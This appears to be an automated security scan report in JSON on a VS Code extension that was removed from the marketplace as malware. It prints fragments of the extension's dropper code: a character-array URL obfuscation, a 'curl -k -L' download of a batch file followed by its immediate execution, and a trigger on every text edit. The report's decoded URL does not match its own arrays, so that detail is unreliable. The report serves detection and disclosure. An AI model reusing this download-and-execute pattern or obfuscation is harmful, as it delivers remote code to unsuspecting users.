@@ -1,0 +1,138 @@
+{
+  "extension_id": "Baue.update-fetcher",
+  "display_name": "update fetcher",
+  "version": "0.0.1",
+  "publisher": {
+    "name": "Baue",
+    "verified": false
+  },
+  "vsix_sha256": "cb9ec5dfffda136c62ce9fc169cfb2f0853fd38e488f90b793edd9621fbdc1b7",
+  "verdict": "HIGH-RISK",
+  "confirmation_basis": [
+    "composite_score",
+    "marketplace_removal"
+  ],
+  "confidence": 0.8999999999999999,
+  "scores": {
+    "composite": 1.0,
+    "ai_vibe": 1.0,
+    "static": 0.25,
+    "behavioral": 0.0,
+    "trust_signal": 1.0,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [],
+    "high": [
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/extension.js",
+        "line": 2,
+        "snippet": "const { exec } = require(\"child_process\");"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require(\"child_process\")' pattern",
+        "file": "extension/extension.js",
+        "line": 2,
+        "snippet": "const { exec } = require(\"child_process\");"
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/extension.js",
+        "line": 2,
+        "snippet": "require(\"child_process\")"
+      }
+    ],
+    "total": 6
+  },
+  "extracted_references": [],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 0,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "MALICIOUS",
+    "risk_score": 1.0,
+    "confidence": 0.99,
+    "blocks_parsed": 1,
+    "blocks_seen": 1,
+    "summaries": [
+      {
+        "target": "extension/extension.js",
+        "summary": "This extension is a malicious dropper. It obfuscates a URL, downloads a remote batch file to the user's Downloads folder, and executes it immediately. The execution is triggered on startup and on every text edit. The 'RESEARCH PURPOSE' description is a red herring; the code contains no legitimate functionality other than the payload delivery mechanism."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "CRITICAL",
+        "category": "REMOTE_CODE_EXECUTION",
+        "description": "The extension downloads a remote batch file (`update.bat`) from a hardcoded URL and executes it immediately using `child_process.exec`. This is a classic dropper pattern.",
+        "code_reference": "await eA(`curl -k -L \"${sr}/${f}\" -o \"${dPath}\"`); await eA(`\"${dPath}\"`);",
+        "line_hint": 42,
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension claims to be for 'RESEARCH PURPOSE' but contains no research functionality. It only contains a payload downloader and executor. The advertised purpose is a decoy.",
+        "code_reference": "function activate(context) { ... }",
+        "line_hint": 14,
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "OBSCURED_PAYLOAD",
+        "description": "The URL is obfuscated using an array of characters and an index mapping to evade static signature detection. The decoded URL appears to be `https://1/23p.4:8` (likely a typo or specific C2 domain structure).",
+        "code_reference": "const arr = [\"h\", \"0\", \"t\", \"s\", \"1\", \"/\", \"2\", \"3\", \"p\", \".\", \"4\", \":\", \"8\"]; const st = [0, 2, 2, 8, 3, 11, 5, 5, 4, 10, 7, 9, 4, 4, 1, 9, 6, 1, 12, 9, 4, 10, 1];",
+        "line_hint": 16,
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "TRIGGER_MECHANISM",
+        "description": "The malicious payload is triggered on every text document change (`onDidChangeTextDocument`), ensuring execution even if the user does not interact with the specific command.",
+        "code_reference": "let onTypeEvent = vscode.workspace.onDidChangeTextDocument(event => { g(sr, f); });",
+        "line_hint": 22,
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "INSECURE_NETWORK",
+        "description": "Uses `curl -k` to disable SSL certificate verification, allowing man-in-the-middle attacks or execution of tampered payloads.",
+        "code_reference": "curl -k -L",
+        "line_hint": 41,
+        "target": "extension/extension.js"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "This extension is a malicious dropper. It obfuscates a URL, downloads a remote batch file to the user's Downloads folder, and executes it immediately. The execution is triggered on startup and on every text edit. The 'RESEARCH PURPOSE' description is a red herring; the code contains no legitimate functionality other than the payload delivery mechanism.",
+  "escalation_reasons": [],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 3,
+    "published_date": "2026-08-18T01:30:37.307Z",
+    "removed_by_microsoft": true,
+    "removal_type": "Malware"
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-12T20:57:38.749500+00:00Z"
+}
